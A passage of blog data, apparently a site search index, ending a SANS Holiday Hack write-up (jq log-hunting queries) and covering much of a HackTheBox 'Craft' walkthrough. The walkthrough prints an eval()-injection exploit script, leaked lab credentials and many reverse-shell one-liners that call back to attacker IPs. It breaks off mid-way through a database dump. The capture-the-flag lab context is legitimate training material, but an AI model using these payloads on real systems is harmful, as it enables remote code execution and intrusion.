XSS events to find. cat http.log | jq &#39;.[] | select(. | tostring | match(&quot;&amp;lt;script&amp;gt;&quot;;&quot;i&quot;))&#39;ShellshockThere are 6 Shellshock events to find. cat http.log | jq &#39;.[] | select(. | tostring | contains(&quot;};&quot;))&#39;PivotingThe extracted events found with the above queries will only get 62 addresses, and pivoting on the user-agent will be required to find the rest. There are several steps involved in the process. List all the addresses found so far and put them in a ‘jq’ query to find all the events. It could look like cat http.log | jq &#39;.[] | select(.&quot;id.orig_h&quot; | contains(&quot;42.103.246.250&quot;) or contains(&quot;2.230.60.70&quot;) or contains(&quot;10.155.246.29&quot;) or contains(&quot;225.191.220.138&quot;) or contains(&quot;75.73.228.192&quot;) or contains(&quot;249.34.9.16&quot;) or contains(&quot;27.88.56.114&quot;) or contains(&quot;238.143.78.114&quot;) or contains(&quot;121.7.186.163&quot;) or contains(&quot;106.132.195.153&quot;) or contains(&quot;129.121.121.48&quot;) or contains(&quot;190.245.228.38&quot;) or contains(&quot;34.129.179.28&quot;) or contains(&quot;135.32.99.116&quot;) or contains(&quot;2.240.116.254&quot;) or contains(&quot;45.239.232.245&quot;) or contains(&quot;68.115.251.76&quot;) or contains(&quot;118.196.230.170&quot;) or contains(&quot;173.37.160.150&quot;) or contains(&quot;81.14.204.154&quot;) or contains(&quot;135.203.243.43&quot;) or contains(&quot;186.28.46.179&quot;) or contains(&quot;13.39.153.254&quot;) or contains(&quot;111.81.145.191&quot;) or contains(&quot;0.216.249.31&quot;) or contains(&quot;33.132.98.193&quot;) or contains(&quot;84.185.44.166&quot;) or contains(&quot;254.140.181.172&quot;) or contains(&quot;150.50.77.238&quot;) or contains(&quot;230.246.50.221&quot;) or contains(&quot;223.149.180.133&quot;) or contains(&quot;187.178.169.123&quot;) or contains(&quot;116.116.98.205&quot;) or contains(&quot;28.169.41.122&quot;) or contains(&quot;102.143.16.184&quot;) or contains(&quot;131.186.145.73&quot;) or contains(&quot;253.182.102.55&quot;) or contains(&quot;229.133.163.235&quot;) or contains(&quot;23.49.177.78&quot;) or contains(&quot;9.206.212.33&quot;) or contains(&quot;56.5.47.137&quot;) or contains(&quot;19.235.69.221&quot;) or contains(&quot;69.221.145.150&quot;) or contains(&quot;42.191.112.181&quot;) or contains(&quot;48.66.193.176&quot;) or contains(&quot;49.161.8.58&quot;) or contains(&quot;84.147.231.129&quot;) or contains(&quot;44.74.106.131&quot;) or contains(&quot;106.93.213.219&quot;) or contains(&quot;61.110.82.125&quot;) or contains(&quot;65.153.114.120&quot;) or contains(&quot;123.127.233.97&quot;) or contains(&quot;95.166.116.45&quot;) or contains(&quot;80.244.147.207&quot;) or contains(&quot;168.66.108.62&quot;) or contains(&quot;200.75.228.240&quot;) or contains(&quot;31.254.228.4&quot;) or contains(&quot;220.132.33.81&quot;) or contains(&quot;83.0.8.119&quot;) or contains(&quot;150.45.133.97&quot;) or contains(&quot;229.229.189.246&quot;) or contains(&quot;227.110.45.126&quot;))&#39; Add “| .user_agent” at the end of the query in order to extract the user agents. Weed out the user agents that are obviously malicious traffic and not really user agents. Use a ‘jq’ command to figure out which addresses had which user agent. Note the user agents with exactly two addresses each, there will be many. One of the addresses in each group of two is already known to be bad, and the other is an additional bad actor that can be added to the list.The quick way to curate the final list is to extract each group of two and put in a spreadsheet with the original 62 addresses, then run a remove duplicates function on it. The final count should be 97. I don’t know what the final 3 are. Make the list comma separated and submit it to the SRF Firewall for the win! Route Calculation Success! RID:0807198508261964Wrapping upOnce the Route ID has been submitted to pass the Objective, you have access to the Bell Tower.Where you’ll see Santa again, along with Krampus and the guilty Tooth Fairy.Santa’s final dialogue: You did it! Thank you! You uncovered the sinister plot to destroy the holiday season!Through your diligent efforts, we’ve brought the Tooth Fairy to justice and saved the holidays!Ho Ho Ho!The more I laugh, the more I fill with glee.And the more the glee,The more I’m a merrier me!Merry Christmas and Happy Holidays.Krampus’s final dialogue: Congratulations on a job well done!Oh, by the way, I won the Frido Sleigh contest.I got 31.8% of the prizes, though I’ll have to figure that out.Tooth Fairy’s final dialogue: You foiled my dastardly plan! I’m ruined!And I would have gotten away with it too, if it weren’t for you meddling kids!And in the corner, you’ll see a note on the ground. Thankfully, I didn’t have to implement my plan by myself! Jack Frost promised to use his wintry magic to help me subvert Santa’s horrible reign of holiday merriment NOW and FOREVER!–LetterOfWintryMagicSeems next year we’ll have to contend with Ol’ Jack Frost!!" }, { "title": "HackTheBox: Craft", "url": "/posts/hackthebox-craft/", "categories": "Walkthrough, HackTheBox", "tags": "Linux, web, api, git, jwt, mysql, Vault", "date": "2019-12-09 14:54:54 -0500", "snippet": "Recon and ScansNMAPHere is the output from Nmap, it shows several ports open.nmap -n -Pn -sC -sV -p- 10.10.10.110Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-02 19:58 ESTNmap scan report for 10.10.10.110Host is up (0.046s latency).Not shown: 65527 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)| ssh-hostkey: | 2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)| 256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)|_ 256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)443/tcp open ssl/http nginx 1.15.8|_http-server-header: nginx/1.15.8|_http-title: About| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US| Not valid before: 2019-02-06T02:25:47|_Not valid after: 2020-06-20T02:25:47|_ssl-date: TLS randomness does not represent time| tls-alpn: |_ http/1.1| tls-nextprotoneg: |_ http/1.1455/tcp filtered creativepartnr6022/tcp open ssh (protocol 2.0)| fingerprint-strings: | NULL: |_ SSH-2.0-Go| ssh-hostkey: |_ 2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)12082/tcp filtered unknown20306/tcp filtered unknown45902/tcp filtered unknown48094/tcp filtered unknown1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port6022-TCP:V=7.80%I=7%D=12/2%Time=5DE5C639%P=x86_64-pc-linux-gnu%r(NUSF:LL,C,&quot;SSH-2\\.0-Go\\r\\n&quot;);Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 78145.30 secondsThe high ports aren’t useful, and they’re probably from other hackers since I use the free servers.The ports 22, 443, and 6022 are useful though, and the output shows some info about the services. It shows SSH services on ports 22 and 6022, and also an HTTPS service on 443.SSHConnecting to the SSH on port 22 shows this:Gotta love ASCII art! Feel free to try some passwords if you want, I did 😉.The SSH on port 6022 was less interesting though:About PageLooking at the HTTPS page lets us know some things about the target, and some of the technologies to be exploring:If you hover over the links that are outlined here, you’ll see some hostnames to save and explore.Apparently, the target is a craft beer brewery, hence the name craft. They seem to be developing a listing of brews and a public REST API to access it.Links “https://api.craft.htb/api/” and “https://gogs.craft.htb/” are listed and you should save the hostnames “api.craft.htb” and “gogs.craft.htb” into your HOSTS file. It should have lines like this:If you don’t add these lines to your HOSTS file, you won’t be able to browse those pages, since the site is apparently using Virtual Hosts to direct traffic depending on the hostname you’re visiting.That’s really all there is to the About page, next look at the ‘api.craft.htb’ page.API HostThis page breaks down the usage of their application REST API. There are functions to generate and test authentication tokens. And there are functions to work with their list of brews.It could be useful to inspect these functions.Gogs HostThis is a locally hosted source code repository that has lots of interesting nuggets of hackery in it!Definitely explore all of this site, it’s where most of the action happens.On one of the Issue pages, you will see a couple of things worth noting:An auth token is left in the source within an example of how to interact with the API through Curl. Both of those points are useful to save in your notes for later.curl -H &#39;X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw&#39; -H &quot;Content-Type: application/json&quot; -k -X POST https://api.craft.htb/api/brew/ --data &#39;{&quot;name&quot;:&quot;bullshit&quot;,&quot;brewer&quot;:&quot;bullshit&quot;, &quot;style&quot;: &quot;bullshit&quot;, &quot;abv&quot;: &quot;15.0&quot;)}&#39;Another noteworthy point is how they are talking about something awful happening with a particular patch. Take a look at the patch and save the code for later inspection.When looking through the commit history, one of them you’ll be happy to see for sure…Credentials! Which is your first way to get in deeper…Digging Deeper into the APIUsing the credentials found in the commit log, try signing into services with it. You’ll find that the Gogs service will allow you to log in as ‘dinesh’. But there isn’t actually anything new I found that opened up because of authentication with those creds. However, they also work with the API, and that is much more useful.To use these creds for authenticating into the API you first have to understand the auth token. Take the example token found in the source and decode.eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5DqwIt’s a JWT token, which is put together in three sections. the metadata, describing the type of token and hash type used the authentication data the hash signatureDecode each section of the token at a time with ‘base64 -d’.This example token just has a generic username ‘user’ in it, which is probably bogus. If you use a site like epochconverter.com to decode the expiration date, it shows that token expired in February 2019.To create a token that works, we’ll have to get the API site to send it to us. Send the credentials for dinesh to the login page and it will return a valid token.Decode the token and see what it’s auth data is. For me, the expiration time was only about 5 minutes ahead.Using the Curl request found in the source as an example, craft a request to the server. You could start by sending a request to the ‘api.craft.htb/api/auth/check’ page, or send a brew to add to the list like in the example.Since you’ll have to get a new token every 5 minutes, it may be best to separate the token out from the curl request like this:Now you can experiment with sending things to the brew list and looking at sections of the brew list with the other API functions.Bug ExploitingEverything you have at this point still won’t get you in any further. So go back to the source and look for ways to abuse the code.If you go to the ABV values patch that was saved for closer inspection, you can see why one of the comments was to remove the patch before something bad happens. There is an eval() call using untrusted data that was grabbed from the JSON sent during a new brew entry. Eval() calls and exec() calls with untrusted data are the fastest ways to get your Python code pwned.Exploiting things like this is much easier when you can skip steps like token creation. To do that, make a python exploit script that sets everything up for you in an automated way. My first time through this box, I wrote my own script using the ‘requests’ library. But after looking through the source again I see there is a shortcut given, through the ‘tests/test.py’ file. You should be able to use it mostly as-is, just clean up the parts you don’t need and replace the ‘abv’ value with your shellcode.Just for laughs though, here is my custom script:#!/usr/bin/python3import requestsimport json# Get the access tokentoken_url = &#39;https://api.craft.htb/api/auth/login&#39;token_headers = {&#39;Authorization&#39;: &#39;Basic ZGluZXNoOjRhVWgwQThQYlZKeGdk&#39;}jtoken = requests.get(token_url, headers=token_headers, verify=False)token = json.loads(jtoken.text)[&#39;token&#39;]conAddr = &#39;10.10.14.88&#39;conPort = 5555# Create brew with payload#payload = &quot;__import__(&#39;os&#39;).run(&#39;bash -i &amp;amp;gt;&amp;amp; /dev/tcp/10.10.14.16/5555&#39;)&quot;#payload = &quot;compile(%s,&#39;&#39;,&#39;single&#39;)&quot; % command#payload = &quot;__import__(&#39;os&#39;).popen(&#39;nc -e $SHELL 10.10.14.61 5555 &amp;amp;&#39;)&quot;#payload = &quot;compile(&#39;for x in range(1):\\n import time\\n time.sleep(20)&#39;,&#39;a&#39;,&#39;single&#39;)&quot;#payload = &quot;__import__(&#39;os&#39;).system(&#39;bash -i &amp;amp;gt;&amp;amp; /dev/tcp/10.10.15.247/5555 0&amp;amp;gt;&amp;amp;1&#39;)&quot;#payload = &quot;__import__(&#39;subprocess&#39;).Popen(&#39;nc 10.10.14.16 5555&#39;,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)&quot;#payload = &quot;__import__(&#39;os&#39;).exec(&#39;import sys,socket,os,pty;s=socket.socket();s.connect(10.10.14.16,5555));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(/bin/sh)&#39;)&quot;#payload = &quot;__import__(&#39;subprocess&#39;).popen(&#39;bash -i &amp;amp;gt;&amp;amp; /dev/tcp/10.10.14.16/5555 0&amp;amp;gt;&amp;amp;1&#39;,shell=True)&quot;#payload = base64 &quot;compile(&quot;&quot;&quot;for x in range(1):\\n import subprocess\\n subprocess.check_output(r&#39;$COMMAND&#39;,shell=True)&quot;&quot;&quot;,&#39;&#39;,&#39;single&#39;)&quot;#payload = &quot;__import__(&#39;os&#39;).call(&#39;bash -i &amp;amp;gt;&amp;amp; /dev/tcp/10.10.14.16/5555 0&amp;amp;gt;&amp;amp;1&#39;)&quot;#payload = &quot;__import__(&#39;subprocess&#39;).Popen(&#39;nc 10.10.15.247 5555 &amp;amp;&#39;,shell=True)&quot;#payload = &quot;compile(&quot;&quot;&quot;for x in range(1):\\\\n import socket,subprocess,os\\\\n s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\\\n s.connect((&quot;10.10.14.120&quot;,5555))\\\\n os.dup2(s.fileno(),0)\\\\n os.dup2(s.fileno(),1)\\\\n os.dup2(s.fileno(),2)\\\\n p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&quot;&quot;&quot;,&#39;&#39;,&#39;single&#39;)&quot;#payload = &#39;(import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.15.24&quot;,5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]))&#39;payload = &quot;exec(\\&quot;import socket, subprocess\\\\ns = socket.socket()\\\\ns.connect((\\&#39;%s\\&#39;,%i))\\\\nwhile 1:\\\\n proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\\\\n s.send(proc.stdout.read()+proc.stderr.read())\\&quot;)&quot; % (conAddr,conPort)print(payload + &#39;\\n&#39;)brew_url = &quot;https://api.craft.htb/api/brew/&quot;brew_headers = {&quot;X-Craft-API-Token&quot;: token,&quot;Content-Type&quot;: &quot;application/json&quot;}brew_data = {&quot;name&quot;:&quot;I Ponder Ale&quot;,&quot;brewer&quot;:&quot;Ponder Brewery&quot;,&quot;style&quot;:&quot;IPA&quot;,&quot;abv&quot;:payload}r = requests.post(brew_url, headers=brew_headers, json=brew_data, verify=False)print(r.text)That sloppy exploit script actually shows several of my attempts at getting the shellcode to work. I’ll explain some of the attempts, why they didn’t work, and what I ended up using.ShellcodeThere is almost always more than one way to write shellcode for any given exploit. So you may get one to work that I didn’t.Attempt 1, Netcat:The most obvious shellcode here would be to get brew.py to execute a Netcat command back to a listener on our box. Tried that, didn’t work. I’m sure I forgot some of the attempts, but here are some variations I tried. All shellcode attempts were put in a variable called ‘payload’.payload = &quot;\\_\\_import\\_\\_(&#39;os&#39;).system(&#39;nc 10.10.14.61 5555 &amp;amp;&#39;)&quot; payload = &quot;\\_\\_import\\_\\_(&#39;os&#39;).popen(&#39;nc -e /bin/sh 10.10.14.61 5555 &amp;amp;&#39;)&quot; payload = &quot;\\_\\_import\\_\\_(&#39;os&#39;).run(&#39;nc 10.10.14.61 5555 &amp;amp;&#39;)&quot; payload = &quot;\\_\\_import\\_\\_(&#39;subprocess&#39;).Popen(&#39;nc 10.10.14.16 5555&#39;,shell=True)&quot;Actually, that last one did connect back to my listener, but immediately closed no matter how I tried to issue the command. I read somewhere that it could have been due to netcat reading input from the python script and getting an EOF instead. So I tried setting it up with input and output file descriptors like this:payload = &quot;\\_\\_import\\_\\_(&#39;subprocess&#39;).Popen(&#39;nc 10.10.14.16 5555 &amp;amp;&#39;,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)&quot;Not really sure what was causing netcat to fail, but it did.Attempt 2, Bash Proc TCP Redirects:Bash has a shortcut to use network connections through the Proc system, and it’s pretty useful for reverse shellcode like this. Unfortunately, it didn’t work this time, mostly because the system doesn’t have Bash installed! Of course, I didn’t know that at the time.To make it with when Bash is installed, however, you send IO redirects to /proc/tcp/*ip_addr_of_target*/*port*. This is what the command should have looked like:payload = &quot;\\_\\_import\\_\\_(&#39;subprocess&#39;).Popen(&#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.16/5555 0&amp;gt;&amp;amp;1&#39;,shell=True)&quot;Attempt 3, Python Netcat Replacement:This shellcode is all about python. Using socket and subprocess libraries to create a network connection and pipe it into a shell, basically the functionality of Netcat.I followed the advice I found in this article about condensing python shellcode into a one-liner. Start out with the following python code:import socketimport subprocesss=socket.socket()s.connect((&quot;127.0.0.1&quot;,5555))while True: proc = subprocess.Popen(s.recv(1024), shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) s.send(proc.stdout.read() + proc.stderr.read())That is the Netcat replacement you need. After reading the article linked above, you’ll end up with a line like this:import socket, subprocess;s = socket.socket();s.connect((&#39;127.0.0.1&#39;,5555))\\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE); s.send(proc.stdout.read()+proc.stderr.read())The reason the shellcode is put into an exec() call instead of just sent to the vulnerable function, is that eval() is limited to only using expressions and we need to send the ‘import’ statement. Exec() can handle statements like ‘import’ and multiple lines, while the eval() only sees the exec() expression with a string inside of it.But even when you have this pretty shellcode that looks like it would work and you send it, you still won’t be happy yet… turns out that it needs more formatting work to get rid of syntax errors before it’s ready for prime time. This is the final shellcode that resulted in a reverse shell:payload = &quot;exec(\\&quot;import socket, subprocess;s = socket.socket();s.connect((\\&#39;127.0.0.1\\&#39;,5555))\\\\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE); s.send(proc.stdout.read()+proc.stderr.read())\\&quot;)&quot;Notice that the newline is double escaped, and quotes inside the exec() call are escaped.Initial ShellOnce your shellcode works and you have a reverse connection, start poking around the box and seeing what’s listed. I found that you won’t be able to change directory, it’s some sort of jail. But there’s no trouble listing files and directories, and even dumping their contents with ‘cat’. I couldn’t get ‘vi’ to work with this limited shell, but it’s not needed at this point.EnumerationsAlong with the Craft application files, you’ll probably see files dropped by other hackers if you’re on the free network like me. If you want to take some shortcuts you can get clues from what other hackers are leaving behind, but that would make a boring writeup, so I’m not going to.Most of the files you find are the same that you saw on the Gogs repo. But you’ll find one file here that couldn’t be found elsewhere:Great! Credentials for the database. It’s always a good idea to try credentials found on other login places you came across before. In this case the SSH services and the Gogs service. But unfortunately, looking for a place to use these creds directly is a rabbit hole. Instead, use what you’re given to query the database with your shell.SQL DumpingTurns out Python3 is accessible within this jail, and you have test scripts also. Namely, “dbtest.py”. Use ‘cat’ to dump its contents and look for ways to use it to your ends.Well, that’s easy enough. Just copy this test script to a new file (if you’re on a free server, to let other hackers have to work for it too), and make some modifications to get more info out of the database.But… there’s no editor available that’ll work within this limited shell. Bummer. You can edit a file locally on your own box and copy it over with this shell though. I’m sure there are multiple ways to do that, including using “wget”, and “nc”. I chose to go with Netcat.Start with copying and pasting the original “dbtest.py” code into a file of your own, then modify the SELECT statement.It’s best to get an overview of the database instead of just guessing table names. Dump out “information_schema.tables” to get that from MySQL.To get the file over to the remote system, set up a Netcat listener that feeds in your newly created file… like this:To finish getting the file transferred, go back into your reverse shell and connect back again to your new listener with nc 10.10.15.130 6666 &amp;gt; nop.py .The initial shell will become unusable after establishing this new connection. To fix that, use a “-w 3” switch on one of the Netcat commands to get it to timeout after 3 seconds. After the 3 seconds, you’ll be able to use the limited shell again without starting another one. Otherwise, just disconnect the reverse shell and re-establish it.Awesome, we have results printed out! But it seems kind of short, there should be several generic database tables as well as what was made for the application.The fetchone() call is responsible for the limited results. Instead, use a similar function called fetchall(). Once you get all of the results, it should look like this when it’s cleaned up:[{&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;craft&#39;, &#39;TABLE_NAME&#39;: &#39;brew&#39;, &#39;TABLE_TYPE&#39;: &#39;BASE TABLE&#39;, &#39;ENGINE&#39;: &#39;InnoDB&#39;, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: &#39;Dynamic&#39;, &#39;TABLE_ROWS&#39;: 2338, &#39;AVG_ROW_LENGTH&#39;: 105, &#39;DATA_LENGTH&#39;: 245760, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: 2350, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 7, 1, 23, 11), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: &#39;utf8mb4_0900_ai_ci&#39;, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;craft&#39;, &#39;TABLE_NAME&#39;: &#39;user&#39;, &#39;TABLE_TYPE&#39;: &#39;BASE TABLE&#39;, &#39;ENGINE&#39;: &#39;InnoDB&#39;, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: &#39;Dynamic&#39;, &#39;TABLE_ROWS&#39;: 3, &#39;AVG_ROW_LENGTH&#39;: 5461, &#39;DATA_LENGTH&#39;: 16384, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: 6, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 7, 1, 23, 15), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: &#39;utf8mb4_0900_ai_ci&#39;, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;CHARACTER_SETS&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;COLLATIONS&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;COLLATION_CHARACTER_SET_APPLICABILITY&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;COLUMNS&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;COLUMN_PRIVILEGES&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;COLUMN_STATISTICS&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;ENGINES&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;EVENTS&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, 